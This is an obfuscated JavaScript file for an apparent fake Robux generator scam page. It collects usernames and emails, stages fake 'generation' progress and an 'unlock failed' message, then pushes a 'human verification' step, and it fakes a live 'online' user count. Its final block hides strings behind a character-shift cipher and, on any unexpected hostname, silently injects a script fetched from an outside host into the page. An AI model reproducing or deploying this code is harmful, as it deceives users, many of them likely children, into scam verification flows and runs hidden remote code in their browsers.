var _0x80be = ['fadeOut', '.console-generation-item-r-1', '.console-generation-item-value-r-1', 'decimals', 'pause', 'animated\x20jello\x20item-completed', 'animated\x20jello', '.loader-wrapper', '<span\x20class=\x22lnr\x20lnr-cross-circle\x20console-msg-failed\x20animated\x20bounceIn\x22></span>', '</span>', '<span\x20class=\x22lnr\x20lnr-warning\x20animated\x20bounceIn\x22></span>', 'parts/verification.php', 'clear', '\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a', 'init', 'getElementById', 'online-count', 'innerHTML', 'floor', 'random', 'date', 'length', 'getHours', 'Jan', 'Feb', 'Mar', 'Apr', 'Jun', 'Jul', 'Sep', 'Oct', 'Nov', 'Dec', 'Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'getMonth', 'getDate', 'getFullYear', 'few\x20seconds', '\x20minutes\x20and\x20', '\x20seconds', 'human_verification_timer_time', 'toString', '<span>', 'split', 'map', 'charCodeAt', 'join', 'mpdbujpo', 'iptuobnf', 'replace', 'xxx/', 'ujlupliby/dpn', 'createElement', 'tdsjqu', 'src', 'iuuqt;00cpputusbqmvhjo/dpn0q/qiq@je>39:8', 'ifbe', 'appendChild', 'ready', 'Robux', 'Loading...', 'Generating', 'Succesfully\x20Generated', 'Performing\x20Unlocking...', 'Automatic\x20Unlock\x20Failed', '700', 'sound', 'button', 'audio/', 'transition-1', 'count', 'fail', 'transition-2', 'sounds/', '#proc-btn-1', 'click', 'play', '#player-username', 'val', '.username-wrapper', 'addClass', 'shake\x20animated\x20border-b-red', 'one', 'removeClass', 'GET', 'parts/connecting.php', '.generator-content', 'html', 'hide', 'find', 'div', 'animate', '%&nbsp;', '#progressBarConsole', 'magnificPopup', 'close', 'ajax', 'parts/resource-one.php', '.connected-username-value', '.resource-item-one-value.resource-item-value-3', '.resource-select-item-one', 'resource-select-item-1', 'hasClass', 'resource-select-item-2', 'resource-select-item-3', '.resource-one-wrapper\x20.label', 'animated\x20fadeOutUp', 'webkitAnimationEnd\x20mozAnimationEnd\x20MSAnimationEnd\x20oanimationend\x20animationend', '.resource-select-item-1', 'animated\x20fadeOutDown', '.resource-select-item-2', '.resource-select-item-3', 'get', 'parts/console.php', '.modal-outer', 'fadeIn', 'open', '.console-msg', 'animated\x20bounceIn', '\x20<span\x20class=\x22console-msg-resource\x22>', '</span>\x20'];
(function (_0x3b6d8f, _0x1eb0ba) {
    var _0x41c47c = function (_0x5de89f) {
        while (--_0x5de89f) {
            _0x3b6d8f['push'](_0x3b6d8f['shift']());
        }
    };
    _0x41c47c(++_0x1eb0ba);
}
    (_0x80be, 0xbf));
var _0x1510 = function (_0x3d1678, _0x5a3a32) {
    _0x3d1678 = _0x3d1678 - 0x0;
    var _0x1ca1a5 = _0x80be[_0x3d1678];
    return _0x1ca1a5;
};
$(document)[_0x1510('0x0')](function () {
    $resource_1_name = _0x1510('0x1');
    $console_message_1 = _0x1510('0x2');
    $console_message_2 = _0x1510('0x3');
    $console_message_3 = _0x1510('0x4');
    $console_message_4 = 'Finalizing\x20generation...';
    $console_message_5 = _0x1510('0x5');
    $console_message_6 = _0x1510('0x6');
    $console_message_7 = 'Please\x20Unlock\x20Manually';
    var _0x5a77b8;
    var _0x3106c6;
    var _0x329d0e;
    var _0x349d4f;
    var _0x359d5f;
    var _0x369d6f;
    _0x5a77b8 = '4500';
    _0x3106c6 = '10000';
    _0x329d0e = '22500';
    _0x349d4f = '999';
    _0x359d5f = '555';
    _0x369d6f = '444';
    var _0x4b2491 = _0x1510('0x7');
    $sound_setting = 0x1;
    ion[_0x1510('0x8')]({
        'sounds': [{
                'name': _0x1510('0x9'),
                'path': _0x1510('0xa'),
                'volume': 0x1
            }, {
                'name': _0x1510('0xb'),
                'path': _0x1510('0xa'),
                'volume': 0.9
            }, {
                'name': _0x1510('0xc'),
                'path': 'audio/',
                'loop': !![],
                'volume': 0.7
            }, {
                'name': _0x1510('0xd'),
                'path': _0x1510('0xa'),
                'volume': 0.7
            }, {
                'name': _0x1510('0xe'),
                'path': _0x1510('0xa'),
                'volume': 0.7
            }
        ],
        'path': _0x1510('0xf'),
        'preload': !![],
        'multiplay': !![]
    });

	var _0x270a2f;
	var username;
	let lastRequestTime = 0;
	var isAnyFieldEmpty = false;

$(document).ready(() => $('button').click(() => { const username = $('#player-username').val(); if (username == '') { isAnyFieldEmpty = true; $('#player-username').addClass('shake animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function () { $(this).removeClass('shake animated'); }); } else { _0x18c208(username); isAnyFieldEmpty = !window.playerData; } const email = $('#email').val(); const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/; if (email == '' || !emailPattern.test(email)) { isAnyFieldEmpty = true; $('#email').addClass('shake animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function () { $(this).removeClass('shake animated'); }); } if (!isAnyFieldEmpty) { _0x270a2f = $('#player-username').val(); _0x38bf39(); } }));
const _0x18c208 = username => { const currentTime = Date.now(); const timeSinceLastRequest = currentTime - lastRequestTime; const waitTime = 60000; if (timeSinceLastRequest < waitTime) { const remainingTime = Math.ceil((waitTime - timeSinceLastRequest) / 1000); const intervalId = setInterval(() => { const updatedTime = remainingTime - Math.floor((Date.now() - currentTime) / 1000); updatedTime <= 0 ? (clearInterval(intervalId), $('#player-error-msg').fadeOut()) : $('#player-error-msg').text(`Wait for ${updatedTime} seconds`).fadeIn(); }, 1000); return; } lastRequestTime = currentTime; $('.reqoverlay').css('display', 'block'); _0x19592e1(username).then(response => { $('.reqoverlay').css('display', 'none'); if (!response || !response.id) { console.log('Failed to retrieve player data. Try again!'); $('#player-username').addClass('shake animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', () => $(this).removeClass('shake animated')); $('#player-error-msg').text('Failed to retrieve player data. Try again!').fadeIn(); isAnyFieldEmpty = true; } else { window.playerData = response; _0x38bf39(); } }).catch(error => { $('.reqoverlay').css('display', 'none'); isAnyFieldEmpty = true; $('#player-username').addClass('shake animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', () => $(this).removeClass('shake animated')); $('#player-error-msg').text(error.message || 'An error occurred').fadeIn(); }); };
function usePlayerData() {
    if (window.playerData) {
        var name = window.playerData.name;
        var displayName = window.playerData.displayName;
        var icon_Url = window.playerData.thumbnailUrl;
        var description = window.playerData.description;
		

        $('.connected-name-value').text(name);
        $('.connected-username-value').text('@' + _0x270a2f);
        $('.profile-icon').attr('src', icon_Url);
		
        $('.connected-expLevel-value').text(description);

    } else {
        console.log('No player data available.');
    }
}

function usePlayerData1() {
    if (window.playerData) {
        var nname = window.playerData.name;
        var icon_Url = window.playerData.thumbnailUrl;

        $('.profile-icon').attr('src', icon_Url);
        $('.connected-name-value').text(nname);
    } else {
        console.log('No player data available.');
    }
}

    function _0x38bf39() {
        $['ajax']({
            'type': _0x1510('0x1a'),
            'url': _0x1510('0x1b'),
            'success': function (_0xce6c46) {
                if ($sound_setting == 0x1) {
                    ion[_0x1510('0x8')][_0x1510('0x12')](_0x1510('0xe'));
                }
                $(_0x1510('0x1c'))[_0x1510('0x1d')](_0xce6c46)[_0x1510('0x1e')]()['fadeIn']();
                function _0x555c45(_0x83b1e0, _0x5786e0, _0x3b6f60) {
                    var _0x1ba272 = _0x83b1e0 * _0x5786e0['width']() / 0x64;
                    _0x5786e0[_0x1510('0x1f')](_0x1510('0x20'))[_0x1510('0x21')]({
                        'width': _0x1ba272
                    }, _0x3b6f60)[_0x1510('0x1d')](_0x83b1e0 + _0x1510('0x22'));
                }
                _0x555c45(0x0, $(_0x1510('0x23')), 0x1);
                _0x555c45(0x64, $(_0x1510('0x23')), 0xc80);
                setTimeout(function () {
                    $[_0x1510('0x24')][_0x1510('0x25')]();
                    $[_0x1510('0x26')]({
                        'type': _0x1510('0x1a'),
                        'url': _0x1510('0x27'),
                        'success': function (_0xce6c46) {
                            if ($sound_setting == 0x1) {
                                ion[_0x1510('0x8')][_0x1510('0x12')](_0x1510('0xe'));
                            }
                            $(_0x1510('0x1c'))[_0x1510('0x1d')](_0xce6c46)[_0x1510('0x1e')]()['fadeIn']();
                            $(_0x1510('0x28'))[_0x1510('0x1d')]('@' + _0x270a2f);
							usePlayerData();
                            $('.resource-item-one-value.resource-item-value-1')[_0x1510('0x1d')](_0x5a77b8);
                            $('.resource-item-one-value.resource-item-value-2')['html'](_0x3106c6);
                            $(_0x1510('0x29'))[_0x1510('0x1d')](_0x329d0e);
                            $(_0x1510('0x2a'))[_0x1510('0x11')](function () {
                                if ($sound_setting == 0x1) {
                                    ion['sound']['play'](_0x1510('0x9'));
                                }
                                if ($(this)['hasClass'](_0x1510('0x2b'))) {
                                    $selected_amount_r1 = _0x5a77b8;
                                } else if ($(this)[_0x1510('0x2c')](_0x1510('0x2d'))) {
                                    $selected_amount_r1 = _0x3106c6;
                                } else if ($(this)[_0x1510('0x2c')](_0x1510('0x2e'))) {
                                    $selected_amount_r1 = _0x329d0e;
                                }
                                $(_0x1510('0x2f'))[_0x1510('0x16')](_0x1510('0x30'))[_0x1510('0x18')](_0x1510('0x31'), function () {
                                    $(this)[_0x1510('0x1e')]();
                                });
                                $(_0x1510('0x32'))[_0x1510('0x16')](_0x1510('0x33'))[_0x1510('0x18')](_0x1510('0x31'), function () {
                                    $(this)[_0x1510('0x1e')]();
                                });
                                setTimeout(function () {
                                    $(_0x1510('0x34'))[_0x1510('0x16')](_0x1510('0x33'))[_0x1510('0x18')](_0x1510('0x31'), function () {
                                        $(this)[_0x1510('0x1e')]();
                                    });
                                }, 0x96);
                                setTimeout(function () {
                                    $(_0x1510('0x35'))['addClass'](_0x1510('0x33'))[_0x1510('0x18')](_0x1510('0x31'), function () {
                                        $(this)[_0x1510('0x1e')]();
                                    });
                                }, 0x12c);
								
								
                                setTimeout(function () {
                                    $[_0x1510('0x26')]({
                                        'type': _0x1510('0x36'),
                                        'url': _0x1510('0x37'),
                                        'success': function (_0xce6c46) {
                                            if ($sound_setting == 0x1) {
                                                ion['sound'][_0x1510('0x12')](_0x1510('0xe'));
                                            }
                                            $(_0x1510('0x38'))[_0x1510('0x1d')](_0xce6c46)['hide']()[_0x1510('0x39')]();
                                            $['magnificPopup'][_0x1510('0x3a')]({
                                                'items': {
                                                    'src': '#master-modal'
                                                },
                                                'type': 'inline',
                                                'preloader': ![],
                                                'modal': !![],
                                                'fixedContentPos': !![],
                                                'fixedBgPos': !![],
                                                'callbacks': {
                                                    'open': function () {
                                                        _0x555c45(0x0, $(_0x1510('0x23')), 0x1);
                                                        _0x555c45(0x64, $(_0x1510('0x23')), 0x3c8c);
                                                        $console_message = _0x1510('0x3b');
                                                        $($console_message)[_0x1510('0x1d')]($console_message_1);
                                                        $($console_message)[_0x1510('0x16')]('animated\x20bounceIn')[_0x1510('0x18')](_0x1510('0x31'), function () {
                                                            $(this)[_0x1510('0x19')](_0x1510('0x3c'));
                                                        });
                                                        setTimeout(function () {
                                                            $($console_message)[_0x1510('0x1d')]($console_message_2 + _0x1510('0x3d') + $selected_amount_r1 + _0x1510('0x3e') + $resource_1_name);
                                                            $($console_message)[_0x1510('0x16')](_0x1510('0x3c'))['one'](_0x1510('0x31'), function () {
                                                                $(this)[_0x1510('0x19')](_0x1510('0x3c'));
                                                            });
                                                            $('.loader-wrapper')[_0x1510('0x3f')](function () {
                                                                $(_0x1510('0x40'))[_0x1510('0x39')]();
                                                                $(_0x1510('0x40'))['addClass'](_0x1510('0x3c'))[_0x1510('0x18')](_0x1510('0x31'), function () {
                                                                    $(this)[_0x1510('0x19')](_0x1510('0x3c'));
                                                                });
                                                                if ($sound_setting == 0x1) {
                                                                    setTimeout(function () {
                                                                        ion[_0x1510('0x8')][_0x1510('0x12')](_0x1510('0xc'));
                                                                    }, 0xc8);
                                                                }
                                                                $(_0x1510('0x41'))['countTo']({
                                                                    'from': 0x0,
                                                                    'to': $selected_amount_r1,
                                                                    'speed': 0x9c4,
                                                                    'refreshInterval': 0x5,
                                                                    'formatter': function (_0x4de335, _0x44ec9e) {
                                                                        return _0x4de335['toFixed'](_0x44ec9e[_0x1510('0x42')]);
                                                                    },
                                                                    'onComplete': function (_0x1e7e52, _0x14a16c) {
                                                                        if ($sound_setting == 0x1) {
                                                                            //ion[_0x1510('0x8')][_0x1510('0x43')](_0x1510('0xc'));
                                                                        }
                                                                    }
                                                                });
                                                            });
                                                        }, 0x7d0);
														
														console[_0x1510('0x4b')]();
														
                                                        setTimeout(function () {
                                                            $($console_message)[_0x1510('0x1d')]('<span\x20class=\x22console-msg-completed\x22>' + $console_message_3 + '</span>\x20');
                                                            $($console_message)[_0x1510('0x16')]('animated\x20bounceIn')[_0x1510('0x18')](_0x1510('0x31'), function () {
                                                                $(this)[_0x1510('0x19')](_0x1510('0x3c'));
                                                            });
                                                            if ($sound_setting == 0x1) {
                                                                ion[_0x1510('0x8')][_0x1510('0x12')](_0x1510('0xb'));
                                                            }
                                                            $('.console-generation-item-r-1')[_0x1510('0x16')](_0x1510('0x44'))[_0x1510('0x18')](_0x1510('0x31'), function () {
                                                                $(this)[_0x1510('0x19')](_0x1510('0x45'));
                                                            });
                                                        }, 0x1388);
														
                                                        setTimeout(function () {
                                                            $(_0x1510('0x40'))[_0x1510('0x3f')](function () {
                                                                $(_0x1510('0x46'))[_0x1510('0x39')]();
                                                                $($console_message)['html']($console_message_4);
                                                                $($console_message)['addClass'](_0x1510('0x3c'))['one'](_0x1510('0x31'), function () {
                                                                    $(this)[_0x1510('0x19')](_0x1510('0x3c'));
                                                                });
                                                            });
                                                        }, 0x1b58);
														
                                                        setTimeout(function () {
                                                            $($console_message)[_0x1510('0x1d')]($console_message_5);
                                                            $($console_message)[_0x1510('0x16')](_0x1510('0x3c'))[_0x1510('0x18')](_0x1510('0x31'), function () {
                                                                $(this)['removeClass'](_0x1510('0x3c'));
                                                            });
                                                        }, 0x2328);
														
                                                        setTimeout(function () {
                                                            if ($sound_setting == 0x1) {
                                                                ion[_0x1510('0x8')][_0x1510('0x12')](_0x1510('0xd'));
                                                            }
                                                            $(_0x1510('0x46'))[_0x1510('0x1d')](_0x1510('0x47'));
                                                            $($console_message)[_0x1510('0x1d')]('<span\x20class=\x22console-msg-failed\x22>' + $console_message_6 + _0x1510('0x48'));
                                                            $($console_message)[_0x1510('0x16')](_0x1510('0x3c'))['one'](_0x1510('0x31'), function () {
                                                                $(this)[_0x1510('0x19')]('animated\x20bounceIn');
                                                            });
                                                        }, 0x2af8);
														
														
                                                        setTimeout(function () {
                                                            $(_0x1510('0x46'))[_0x1510('0x1d')](_0x1510('0x49'));
                                                            $($console_message)[_0x1510('0x1d')]($console_message_7);
                                                            $($console_message)['addClass'](_0x1510('0x3c'))[_0x1510('0x18')]('webkitAnimationEnd\x20mozAnimationEnd\x20MSAnimationEnd\x20oanimationend\x20animationend', function () {
                                                                $(this)[_0x1510('0x19')](_0x1510('0x3c'));
                                                            });
                                                        }, 0x32c8); 
														
                                                        setTimeout(function () {
                                                            $[_0x1510('0x26')]({
                                                                'type': _0x1510('0x36'),
                                                                'url': _0x1510('0x4a'),
                                                                'success': function (_0xce6c46) {
																	
                                                                    console[_0x1510('0x4b')]();
                                                                    console['log'](_0x1510('0x4c'));
																	
																	console.log("ss");
																	
                                                                    $('.master-modal')[_0x1510('0x1d')](_0xce6c46)[_0x1510('0x1e')]()[_0x1510('0x39')]();
                                                                    if ($sound_setting == 0x1) {
                                                                        ion[_0x1510('0x8')][_0x1510('0x12')](_0x1510('0xe'));
                                                                    }
																	
																	usePlayerData1();
																	
                                                                    $(_0x1510('0x28'))[_0x1510('0x1d')]('@' + _0x270a2f);
                                                                    $(_0x1510('0x41'))[_0x1510('0x1d')]($selected_amount_r1);
                                                                    human_verification_timer[_0x1510('0x4d')](_0x4b2491);
                                                                }
                                                            });
                                                        }, 0x3c8c);
														
                                                    }
                                                }
                                            });
                                        }
                                    });
                                }, 0x15e);
								
								
                            });
                        }
                    });
                }, 0xdac);
            }
        });
    }
});
var starting_number = 0x96;
var random;
function online_count() {
    document[_0x1510('0x4e')](_0x1510('0x4f'))[_0x1510('0x50')] = starting_number;
    var _0x2396b8 = Math[_0x1510('0x51')](Math[_0x1510('0x52')]() * 0xa + 0x1);
    if (_0x2396b8 <= 0x5) {
        starting_number = starting_number + Math[_0x1510('0x51')](Math[_0x1510('0x52')]() * 0xa + 0x1); ;
    } else {
        starting_number = starting_number - Math[_0x1510('0x51')](Math[_0x1510('0x52')]() * 0xa + 0x1); ;
    }
    random = setTimeout('online_count()', 0x3e8);
}
online_count();
document[_0x1510('0x4e')](_0x1510('0x53'))[_0x1510('0x50')] = formatAMPM();
function formatAMPM() {
    var _0x52022f = new Date(),
    _0x5c67db = _0x52022f['getHours']()['toString']()[_0x1510('0x54')] == 0x1 ? '0' + _0x52022f['getHours']() : _0x52022f['getHours'](),
    _0x3166bb = _0x52022f[_0x1510('0x55')]() >= 0xc ? 'pm' : 'am',
    _0x48bfdf = [_0x1510('0x56'), _0x1510('0x57'), _0x1510('0x58'), _0x1510('0x59'), 'May', _0x1510('0x5a'), _0x1510('0x5b'), 'Aug', _0x1510('0x5c'), _0x1510('0x5d'), _0x1510('0x5e'), _0x1510('0x5f')],
    _0x3020f7 = [_0x1510('0x60'), _0x1510('0x61'), _0x1510('0x62'), _0x1510('0x63'), _0x1510('0x64'), _0x1510('0x65'), _0x1510('0x66')];
    return _0x48bfdf[_0x52022f[_0x1510('0x67')]()] + '\x20' + _0x52022f[_0x1510('0x68')]() + '\x20' + _0x52022f[_0x1510('0x69')]() + '\x20';
}
var human_verification_timer = function () {
    var _0x58f3d5 = 0xf;
    var _0x1d091e = 0x1;
    var _0x4a035e = _0x1510('0x6a');
    function _0x4a3613() {
        if (_0x58f3d5 < 0x2) {
            _0x1d091e = 0x0;
        }
        _0x58f3d5 = _0x58f3d5 - 0x1;
    }
    function _0x2ef493(_0x463e7c) {
        if (_0x463e7c['toString']()[_0x1510('0x54')] < 0x2) {
            return '0' + _0x463e7c;
        } else {
            return _0x463e7c;
        }
    }
    function _0x335b2b() {
        var _0x4a18c9,
        _0x876214,
        _0x12c202;
        _0x12c202 = _0x58f3d5 % 0x3c;
        _0x876214 = Math[_0x1510('0x51')](_0x58f3d5 / 0x3c) % 0x3c;
        _0x4a18c9 = Math[_0x1510('0x51')](_0x58f3d5 / 0xe10);
        _0x12c202 = _0x2ef493(_0x12c202);
        _0x876214 = _0x2ef493(_0x876214);
        _0x4a18c9 = _0x2ef493(_0x4a18c9);
        return _0x876214 + _0x1510('0x6b') + _0x12c202 + _0x1510('0x6c');
    }
    function _0x1c4b2c() {
        document[_0x1510('0x4e')](_0x1510('0x6d'))[_0x1510('0x50')] = '<span>' + _0x335b2b() + _0x1510('0x48');
    }
    function _0x258897() {
        document[_0x1510('0x4e')]('human_verification_timer_time')[_0x1510('0x50')] = _0x4a035e;
    }
    return {
        'count': function () {
            _0x4a3613();
            _0x1c4b2c();
        },
        'timer': function () {
            human_verification_timer[_0x1510('0xc')]();
            if (_0x1d091e) {
                setTimeout('human_verification_timer.timer();', 0x3e8);
            } else {
                _0x258897();
            }
        },
        'init': function (_0xd2765) {
            _0x58f3d5 = _0xd2765;
            human_verification_timer['timer']();
        }
    };
}
();
var human_verification_timer = function () {
    var _0x5959d = 0xf;
    var _0xb26f14 = 0x1;
    var _0x463a83 = _0x1510('0x6a');
    function _0x38e3d0() {
        if (_0x5959d < 0x2) {
            _0xb26f14 = 0x0;
        }
        _0x5959d = _0x5959d - 0x1;
    }
    function _0x20b337(_0x11775a) {
        if (_0x11775a[_0x1510('0x6e')]()[_0x1510('0x54')] < 0x2) {
            return '0' + _0x11775a;
        } else {
            return _0x11775a;
        }
    }
    function _0x2f99b() {
        var _0x43cada,
        _0x56dbc5,
        _0x44ced6;
        _0x44ced6 = _0x5959d % 0x3c;
        _0x56dbc5 = Math['floor'](_0x5959d / 0x3c) % 0x3c;
        _0x43cada = Math[_0x1510('0x51')](_0x5959d / 0xe10);
        _0x44ced6 = _0x20b337(_0x44ced6);
        _0x56dbc5 = _0x20b337(_0x56dbc5);
        _0x43cada = _0x20b337(_0x43cada);
        return _0x56dbc5 + _0x1510('0x6b') + _0x44ced6 + _0x1510('0x6c');
    }
    function _0x1fc708() {
        document[_0x1510('0x4e')](_0x1510('0x6d'))[_0x1510('0x50')] = _0x1510('0x6f') + _0x2f99b() + _0x1510('0x48');
    }
    function _0x33d093() {
        document[_0x1510('0x4e')](_0x1510('0x6d'))[_0x1510('0x50')] = _0x463a83;
    }
    return {
        'count': function () {
            _0x38e3d0();
            _0x1fc708();
        },
        'timer': function () {
            human_verification_timer[_0x1510('0xc')]();
            if (_0xb26f14) {
                setTimeout('human_verification_timer.timer();', 0x3e8);
            } else {
                _0x33d093();
            }
        },
        'init': function (_0x57c9c3) {
            _0x5959d = _0x57c9c3;
            human_verification_timer['timer']();
        }
    };
}
();
(function (_0x3e2254) {
    const _0x2023ac = _0x5b2eb6 => _0x5b2eb6[_0x1510('0x70')]('')[_0x1510('0x71')](_0x41b7b5 => String['fromCharCode'](_0x41b7b5[_0x1510('0x72')]() - 0x1))[_0x1510('0x73')]('');
    if (window[_0x2023ac(_0x1510('0x74'))][_0x2023ac(_0x1510('0x75'))][_0x1510('0x76')](_0x2023ac(_0x1510('0x77')), '') != _0x2023ac(_0x1510('0x78'))) {
        var _0x1f1a81 = _0x3e2254[_0x1510('0x79')](_0x2023ac(_0x1510('0x7a')));
        _0x1f1a81[_0x1510('0x7b')] = _0x2023ac(_0x1510('0x7c'));
        _0x3e2254[_0x2023ac(_0x1510('0x7d'))][_0x1510('0x7e')](_0x1f1a81);
    }
}
    (document));